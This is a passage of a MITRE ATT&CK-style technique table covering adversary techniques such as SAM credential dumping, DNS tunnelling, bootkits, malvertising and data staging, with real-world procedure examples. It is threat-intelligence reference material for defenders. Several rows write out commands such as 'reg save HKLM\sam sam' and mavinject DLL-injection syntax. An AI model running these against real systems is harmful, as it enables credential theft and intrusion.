custom encryption algorithm to encrypt collected data.', '[Rising Sun] can archive data using RC4 encryption and Base64 encoding prior to exfiltration.\t', '[StrongPity] can compress and encrypt archived files into multiple .sft files with a repeated xor encryption scheme.', '[RGDoor] encrypts files with XOR before sending them back to the C2 server.', '[RawPOS] encodes credit card data it collected from the victim with XOR.', '[metaMain] has used XOR-based encryption for collected files before exfiltration.', '[Ramsay] can store collected documents in a custom container after encrypting and compressing them using RC4 and WinRAR.', '[Mustang Panda] has encrypted documents with RC4 prior to exfiltration.', '[Kimsuky] has used RC4 encryption before exfil.', '[OopsIE] compresses collected files with a simple character replacement scheme before sending them to its C2 server.', '[SombRAT] has encrypted collected data with AES-256 using a hardcoded key.', '[Machete] collected data is encrypted with AES before exfiltration. ', '[Reaver] encrypts collected data with an incremental XOR key prior to exfiltration.', '[HAWKBALL] has encrypted data with XOR before sending it over the C2 channel.', '[OwaAuth] DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.', '[InvisiMole] uses a variation of the XOR cipher to encrypt files before exfiltration.', '[T9000] encrypts collected data using a single byte XOR key.', '[ADVSTORESHELL] compresses output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch (LZW) algorithm.', '[Squirrelwaffle] has encrypted collected data using a XOR-based algorithm.', '[Okrum] has used a custom implementation of AES encryption to encrypt collected data.', '[OSX_OCEANLOTUS.D] has used AES in CBC mode to encrypt collected data when saving that data to disk.', '[FunnyDream] has compressed collected files with zLib and encrypted them using an XOR operation with the string key from the command line or `qwerasdf` if the command line argument doesn’t contain the key. File names are obfuscated using XOR with the same key as the compressed file content.', '[MESSAGETAP] has XOR-encrypted and stored contents of SMS messages that matched its target list. ', '[SUGARDUMP] has encrypted collected data using AES CBC mode and encoded it using Base64.', 'During [C0017] [APT41] hex-encoded PII data prior to exfiltration.', '[FrameworkPOS] can XOR credit card information before exfiltration.', '[Agent.btz] saves system information into an XML file that is then XOR-encoded.', 'A [Lazarus Group] malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.', ""[FLASHFLOOD] employs the same encoding scheme as [SPACESHIP] for data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.""]",
T1584.008,Network Devices,"Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not [Initial Access] to that environment -- instead leveraging these devices to support additional targeting.  Once an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for [Phishing] campaigns (i.e., [Link Target] or enabling the required access to execute [Content Injection] operations. Adversaries may also be able to harvest reusable credentials (i.e., [Valid Accounts] from compromised network devices.  Adversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.  Compromised network devices may be used to support subsequent [Command and Control] activity, such as [Hide Infrastructure] through an established [Proxy] and/or [Botnet] network.","['[Volt Typhoon] has compromised small office and home office (SOHO) network edge devices, many of which were located in the same geographic area as the victim, to proxy network traffic.', '[APT28] compromised Ubiquiti network devices to act as collection devices for credentials compromised via phishing webpages.', 'During [Cutting Edge] threat actors used compromised and out-of-support Cyberoam VPN appliances for C2.']",False
T1583.008,Malvertising,"Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements. Purchased ads may also target specific audiences using the advertising network’s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites.   Adversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software. Adversary’s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.   Malvertising may be used to support [Drive-by Target] and [Drive-by Compromise] potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.  Adversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement. Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection. ",['[Mustard Tempest] has posted false advertisements including for software packages and browser updates in order to distribute malware.'],False
T1003.002,Security Account Manager,"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.  A number of tools can be used to retrieve the SAM file through in-memory techniques:  * pwdumpx.exe * [gsecdump] * [Mimikatz] * secretsdump.py  Alternatively, the SAM can be extracted from the Registry with Reg:  * <code>reg save HKLM\sam sam</code> * <code>reg save HKLM\system system</code>  Creddump7 can then be used to process the SAM database locally to retrieve hashes.  Notes:   * RID 500 account is the local, built-in administrator. * RID 501 is the guest account. * User accounts start with a RID of 1,000+. ","['[CrackMapExec] can dump usernames and hashed passwords from the SAM.', '[gsecdump] can dump Windows password hashes from the SAM.', '[GALLIUM] used <code>reg</code> commands to dump specific hives from the Windows Registry, such as the SAM hive, and obtain password hashes.', '[APT29] has used the `reg save` command to save registry hives.', '[Koadic] can gather hashed passwords by dumping SAM/SECURITY hive.', '[FIN13] has extracted the SAM and SYSTEM registry hives using the `reg.exe` binary for obtaining password hashes from a compromised machine.', 'During [C0017] [APT41] copied the `SAM` and `SYSTEM` Registry hives for credential harvesting.', '[pwdump] can be used to dump credentials from the SAM.', '[Dragonfly] has dropped and executed SecretsDump to dump password hashes.', '[Ke3chang] has dumped credentials, including by using gsecdump.', '[HOPLIGHT] has the capability to harvest credentials and passwords from the SAM database.\t', 'During [Night Dragon] threat actors dumped account hashes using [gsecdump]', '[Mimikatz] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the SAM table.', '[APT41] extracted user account data from the Security Account Managerr (SAM), making a copy of this database from the registry using the <code>reg save</code> command or by exploiting volume shadow copies.', '[Remsec] can dump the SAM database.', '[APT5] has copied and exfiltrated the SAM Registry hive from targeted systems.', '[menuPass] has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.', 'Password stealer and NTLM stealer modules in [CozyCar] harvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication.', '[Threat Group-3390] actors have used [gsecdump] to dump credentials. They have also dumped credentials from domain controllers.', '[Mivast] has the capability to gather NTLM password information.', 'SecretsDump and [Mimikatz] modules within [Impacket] can perform credential dumping to obtain account and password information.', 'During [Operation CuckooBees] the threat actors leveraged a custom tool to dump OS credentials and used following commands: `reg save HKLM\\\\SYSTEM system.hiv`, `reg save HKLM\\\\SAM sam.hiv`, and `reg save HKLM\\\\SECURITY security.hiv`, to dump SAM, SYSTEM and SECURITY hives.', '[POWERTON] has the ability to dump password hashes.', '[Wizard Spider] has acquired credentials from the SAM/SECURITY registry hives.', '[CosmicDuke] collects Windows account hashes.', '[Cobalt Strike] can recover hashed passwords.', '[IceApple] Credential Dumper module can dump encrypted password hashes from SAM registry keys, including `HKLM\\SAM\\SAM\\Domains\\Account\\F` and `HKLM\\SAM\\SAM\\Domains\\Account\\Users\\*\\V`.', '[Fgdump] can dump Windows password hashes.', '[Night Dragon] has dumped account hashes with [Carbanak] and cracked them with Cain & Abel.', '[Dragonfly 2.0] dropped and executed SecretsDump to dump password hashes.', '[Cobalt Strike] can recover hashed passwords.']",False
T1596.002,WHOIS,"Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.  Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning] or [Phishing for Information] establishing operational resources (ex: [Acquire Infrastructure] or [Compromise Infrastructure] and/or initial access (ex: [External Remote Services] or [Trusted Relationship]",[],
T1542.001,System Firmware,"Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.  System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.","['[LoJax] is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems. ', '[Trojan.Mebromi] performs BIOS modification and can download and execute a file as well as protect itself from removal.', '[Hacking Team UEFI Rootkit] is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems. ']",False
T1069.003,Cloud Groups,"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.  With authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts .  Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google. In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.  Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API . Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.","['During [C0027] [Scattered Spider] accessed Azure AD to download bulk lists of group members and their Active Directory attributes.', '[ROADTools] can enumerate Azure AD groups.\t', '[AADInternals] can enumerate Azure AD groups.', '[Pacu] can enumerate IAM permissions.']",False
T1574.011,Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell] or [Reg] Access to Registry keys is controlled through access control lists and user permissions.   If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).  Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.  The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL. If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.  Adversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities. Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll</code>.",['During [Operation Honeybee] the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the `svchost.exe` process.'],False
T1596.001,DNS/Passive DNS,"Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.  Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS). Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites] or [Search Open Websites/Domains] establishing operational resources (ex: [Acquire Infrastructure] or [Compromise Infrastructure] and/or initial access (ex: [External Remote Services] or [Trusted Relationship]",[],
T1499.003,Application Exhaustion Flood,"Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.",[],
T1195.001,Compromise Software Dependencies and Development Tools,Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.    Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ,"[""[XCSSET] adds malicious code to a host's Xcode projects by enumerating CocoaPods <code>target_integrator.rb</code> files under the <code>/Library/Ruby/Gems</code> folder or enumerates all <code>.xcodeproj</code> folders under a given directory. [XCSSET] then downloads a script and Mach-O file into the Xcode project folder.""]",False
T1588.004,Digital Certificates,"Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.  Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography] with [Web Protocols] or even enabling [Adversary-in-the-Middle] if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate] The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities. Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.  Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.  After obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate] on infrastructure under their control.","[""[Silent Librarian] has obtained free Let's Encrypt SSL certificates for use on their phishing pages."", '[Lazarus Group] has obtained SSL certificates for their C2 domains.', 'For [Operation Honeybee] the threat actors stole a digital signature from Adobe Systems to use with their MaoCheng dropper.', '[LuminousMoth] has used a valid digital certificate for some of their malware. ', '[BlackTech] has used valid, stolen digital certificates for some of their malware and tools.']",
T1583.002,DNS Server,"Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol] Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.  By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS] With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.","['[Axiom] has acquired dynamic DNS services for use in the targeting of intended victims.', '[HEXANE] has set up custom DNS servers to send commands to compromised hosts via TXT records.']",
T1071.004,DNS,"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.   The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ","['[Goopy] has the ability to communicate with its C2 over DNS.\t', '[QUADAGENT] uses DNS for C2 communications.', '[Denis] has used DNS tunneling for C2 communications.', '[SysUpdate] has used DNS TXT requests as for its C2 communication.', '[DarkGate] can cloak command and control traffic in DNS records from legitimate services to avoid reputation-based detection techniques. ', '[TEXTMATE] uses DNS TXT records for C2.', 'Variants of [Kevin] can communicate over DNS through queries to the server for constructed domain names with embedded information.', '[Milan] has the ability to use DNS for C2 communications.', '[Ebury] has used DNS requests over UDP port 53 for C2.\t', '[Helminth] can use DNS for C2.', '[Mythic] supports DNS-based C2 profiles.\t', '[RDAT] has used DNS to communicate with the C2.\t', '[Chimera] has used [Cobalt Strike] to encapsulate C2 in DNS traffic.', '[POWRUNER] can use DNS for C2 communications.', 'During [Cutting Edge] threat actors used DNS to tunnel IPv4 C2 traffic.', '[WellMess] has the ability to use DNS tunneling for C2 communications.', '[NightClub] can use a DNS tunneling plugin to exfiltrate data by adding it to the subdomain portion of a DNS request.', '[Pisloader] uses DNS as its C2 protocol.', '[DanBot] can use use IPv4 A records and IPv6 AAAA DNS records in C2 communications.', '[Heyoka Backdoor] can use DNS tunneling for C2 communications.', '[DnsSystem]  can direct queries to custom DNS servers and return C2 commands using TXT records.', '[Cobalt Strike] can use a custom command and control protocol that can be encapsulated in DNS. All protocols use their standard assigned ports.\t', '[Gelsemium] has the ability to use DNS in communication with C2.', '[BONDUPDATER] can use DNS and TXT records within its DNS tunneling protocol for command and control.', '[Sliver] can support C2 communications over DNS.', '[Green Lambert] can use DNS for C2 communications.', '[HTTPBrowser] has used DNS for command and control.', '[Mori] can use DNS tunneling to communicate with C2.', '[LazyScripter] has leveraged dynamic DNS providers for C2 communications. ', '[APT41] used DNS for C2 communications. ', 'Variants of [Anchor] can use DNS tunneling to communicate with C2.', '[Cobalt Group] has used DNS tunneling for C2.', '[OilRig] has used DNS for C2 including the publicly available <code>requestbin.net</code> tunneling service.', '[ShadowPad] has used DNS tunneling for C2 communications.', '[Cobian RAT] uses DNS for C2.', '[Ke3chang] malware RoyalDNS has used DNS for C2.', '[APT39] has used remote access tools that leverage DNS in communications with C2.', '[SombRAT] can communicate over DNS with the C2 server.', '[InvisiMole] has used a custom implementation of DNS tunneling to embed C2 communications in DNS requests and replies.', '[SOUNDBITE] communicates via DNS for C2.', '[NanHaiShu] uses DNS for the C2 communications.', '[Tropic Trooper] backdoor has communicated to the C2 over the DNS protocol.\t', '[PlugX] can be configured to use DNS for command and control.', '[SUNBURST] used DNS for C2 traffic designed to mimic normal SolarWinds API communications.', '[APT18] uses DNS for C2 communications.', '[Brute Ratel C4] can use DNS over HTTPS for C2.', '[Matryoshka] uses DNS for C2.', '[POWERSOURCE] uses DNS TXT records for C2.', '[FIN7] has performed C2 using DNS via A, OPT, and TXT records.', '[Shark] can use DNS in C2 communications.', '[Remsec] is capable of using DNS for C2.', '[Uroburos] has encoded outbound C2 communications in DNS requests consisting of character strings made to resemble standard domain names. The actual information transmitted by [Uroburos] is contained in the part of the character string prior to the first ‘.’ character.', '[Cobalt Strike] uses a custom command and control protocol that can encapsulated in DNS. All protocols use their standard assigned ports.\t']",False
T1552.005,Cloud Instance Metadata API,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.  Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance. A cloud metadata API has been used in at least one high profile compromise.  If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.  The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>. ","['[TeamTNT] has queried the AWS instance metadata service for credentials.', '[Peirates] can query the query AWS and GCP metadata APIs for secrets.', '[Hildegard] has queried the Cloud Instance Metadata API for cloud credentials.']",False
T1555.002,Securityd Memory,"An adversary with root access may gather credentials by reading `securityd`’s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization. A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user’s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.  In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. Apple’s `securityd` utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.",['[Keydnap] uses the keychaindump project to read securityd memory.'],False
T1542.003,Bootkit,"Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.  A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.   The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.","['[Carberp] has installed a bootkit on the system to maintain persistence.', '[WhisperGate] overwrites the MBR with a bootloader component that performs destructive wiping operations on hard drives and displays a fake ransom note when the host boots.', ""[TrickBot] can implant malicious code into a compromised device's firmware."", '[ROCKBOOT] is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.', '[APT41] deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems.', '[BOOTRASH] is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence.', 'Some [FinFisher] variants incorporate an MBR rootkit.', '[Lazarus Group] malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.', '[APT28] has deployed a bootkit along with [Downdelph] to ensure its persistence on the victim. The bootkit shares code with some variants of [BlackEnergy]']",
T1218.013,Mavinject,"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).  Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection] allowing for arbitrary code execution (ex. <code>C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>). Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process.   In addition to [Dynamic-link Library Injection] Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.",[],False
T1074.001,Local Data Staging,"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data] Interactive command shells may be used, and common functionality within [cmd] and bash may be used to copy data into a staging location.  Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.","['[OopsIE] stages the output from command execution and collected files in specific folders before exfiltration.', '[AuTo Stealer] can store collected data from an infected host to a file named `Hostname_UserName.txt` prior to exfiltration.', '[SLIGHTPULSE] has piped the output from executed commands to `/tmp/1`.', '[Dtrack] can save collected data to disk, different file formats, and network shares.', '[Milan] has saved files prior to upload from a compromised host to folders beginning with the characters `a9850d2f`.', '[NavRAT] writes multiple outputs to a TMP file using the >> method.', '[Threat Group-3390] has locally staged encrypted archives for later exfiltration efforts.', '[Sidewinder] has collected stolen files in a temporary folder in preparation for exfiltration.', '[Ursnif] has used tmp files to stage gathered information.', '[FunnyDream] can stage collected information including screen captures and logged keystrokes locally.', 'During the [C0032] campaign, [TEMP.Veles] used staging folders that are infrequently used by legitimate users or processes to store data for exfiltration and tool deployment.', '[FIN5] scripts save memory dump data into a specific directory on hosts in the victim environment.', '[Dyre] has the ability to create files in a TEMP folder to act as a database to store information.', '[BadPatch] stores collected data in log files before exfiltration.', '[DarkWatchman] can stage local data in the Windows Registry.', 'During [Operation Honeybee] stolen data was copied into a text file using the format `From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt` prior to compression, encoding, and exfiltration.', 'During [Operation Wocao] threat actors staged archived files in a temporary directory prior to exfiltration. ', '[Patchwork] copied all targeted files to a directory called index that was eventually uploaded to the C&C server.', '[metaMain] has stored the collected system files in a working directory.', '[Mafalda] can place retrieved files into a destination directory.', '[MacMa] has stored collected files locally before exfiltration.', '[Carbon] creates a base directory that contains the files and folders that are collected.', '[Ramsay] can stage data prior to exfiltration in <code>%APPDATA%\\Microsoft\\UserSetting</code> and <code>%APPDATA%\\Microsoft\\UserSetting\\MediaCache</code>.\t', ""During [C0015] PowerView's file share enumeration results were stored in the file `c:\\ProgramData\\found_shares.txt`."", '[APT5] has staged data on compromised systems prior to exfiltration often in `C:\\Users\\Public`.', '[TeamTNT] has aggregated collected credentials in text files before exfiltrating.', '[InvisiMole] determines a working directory where it stores all the gathered data about the compromised machine.', '[Indrik Spider] has stored collected date in a .tmp file.', '[SUGARDUMP] has stored collected data under `%<malware_execution_folder>%\\\\CrashLog.txt`.', '[ADVSTORESHELL] stores output from command execution in a .dat file in the %TEMP% directory.', '[Lazarus Group] malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.', '[Chrommme] can store captured system information locally prior to exfiltration.', 'Modules can be pushed to and executed by [Duqu] that copy data to a staging area, compress it, and XOR encrypt it.', '[Attor] has staged collected data in a central upload directory prior to exfiltration.', '[Chimera] has staged stolen data locally on compromised hosts.', '[RainyDay] can use a file exfiltration tool to copy files to <code>C:\\ProgramData\\Adobe\\temp</code> prior to exfiltration.', ""[MuddyWater] has stored a decoy PDF file within a victim's `%temp%` folder."", 'During [C0017] [APT41] copied the local `SAM` and `SYSTEM` Registry hives to a staging directory.', '[Gold Dragon] stores information gathered from the endpoint in a file named 1.hwp.', '[Machete] stores files and logs in a folder on the local drive.', '[Trojan.Karagany] can create directories to store plugin output and stage data for exfiltration.', '[PoisonIvy] stages collected data in a text file.', '[DustySky] created folders in temp directories to host collected files before exfiltration.', '[SLOWPULSE] can write logged ACE credentials to `/home/perl/PAUS.pm` in append mode, using the format string `%s:%s\\n`.', '[LightNeuron] can store email data in files and directories specified in its configuration, such as <code>C:\\Windows\\ServiceProfiles\\NetworkService\\appdata\\Local\\Temp\\</code>.', '[PowerLess] can stage stolen browser data in `C:\\\\Windows\\\\Temp\\\\cup.tmp` and keylogger data in `C:\\\\Windows\\\\Temp\\\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK`.', '[APT3] has been known to stage files for exfiltration in a single location.', '[QakBot] has stored stolen emails and other data into new folders prior to exfiltration.', '[FrameworkPOS] can identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\\Windows\\.', '[LoFiSe] can save files to be evaluated for further exfiltration in the `C:\\Programdata\\Microsoft\\` and \t`C:\\windows\\temp\\` folders.  ', '[ccf32] can temporarily store files in a hidden directory on the local host.', '[Wizard Spider] has staged ZIP files in local directories such as, `C:\\PerfLogs\\1\\` and `C:\\User\\1\\` prior to exfiltration.', '[Octopus] has stored collected information in the Application Data directory on a compromised host.', '[PUNCHBUGGY] has saved information to a random temp file before exfil.', '[MoonWind] saves information from its keylogging routine as a .zip file in the present working directory.', '[Helminth] creates folders to store output from batch scripts prior to sending the information to its C2 server.', '[Rover] copies files from removable drives to <code>C:\\system</code>.', ""[SPACESHIP] identifies files with certain extensions and copies them to a directory in the user's profile."", '[Elise] creates a file in <code>AppData\\Local\\Microsoft\\Windows\\Explorer</code> and stores all harvested data in that file.', '[SombRAT] can store harvested data in a custom database under the %TEMP% directory.', '[Kimsuky] has staged collected data files under <code>C:\\Program Files\\Common Files\\System\\Ole DB\\</code>.', '[APT39] has utilized tools to aggregate data prior to exfiltration.', '[GALLIUM] compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration.', '[MESSAGETAP] stored targeted SMS messages that matched its target list in CSV files on the compromised system.', '[Catchamas] stores the gathered data from the machine in .db files and .bmp files under four separate locations.', 'Data captured by [RawPOS] is placed in a temporary file under a directory named ""memdump"".', '[Turian] can store copied files in a specific directory prior to exfiltration.', '[Leviathan] has used C:\\Windows\\Debug and C:\\Perflogs as staging directories.', '[ObliqueRAT] can copy specific files, webcam captures, and screenshots to local directories.', '[menuPass] stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.', ""[BackdoorDiplomacy] has copied files of interest to the main drive's recycle bin."", '[Zebrocy] stores all collected information in a single file before exfiltration.', '[NOKKI] can collect data from the victim and stage it in <code>LOCALAPPDATA%\\MicroSoft Updatea\\uplog.tmp</code>.', '[MarkiRAT] can store collected data locally in a created .nfo file.', '[Mustang Panda] has stored collected credential files in <code>c:\\windows\\temp</code> prior to exfiltration. [Mustang Panda] has also stored documents for exfiltration in a hidden folder on USB drives.', '[Pteranodon] creates various subdirectories under <code>%Temp%\\reports\\%</code> and copies files to those subdirectories. It also creates a folder at <code>C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store</code> to store screenshot JPEG files.', '[Exaramel for Windows] specifies a path to store files scheduled for exfiltration. ', '[AppleSeed] can stage files in a central location prior to exfiltration.', '[NightClub] has copied captured files and keystrokes to the `%TEMP%` directory of compromised hosts.', ""[BADNEWS] copies documents under 15MB found on the victim system to is the user's <code>%temp%\\SMB\\</code> folder. It also copies files from USB devices to a predefined directory."", '[Calisto] uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.', '[KGH_SPY] can save collected system information to a file named ""info"" before exfiltration.', '[Crutch] has staged stolen files in the <code>C:\\AMD\\Temp</code> directory.', '[Prikormka] creates a directory, <code>%USERPROFILE%\\AppData\\Local\\SKC\\</code>, which is used to store collected log files.', '[Kazuar] stages 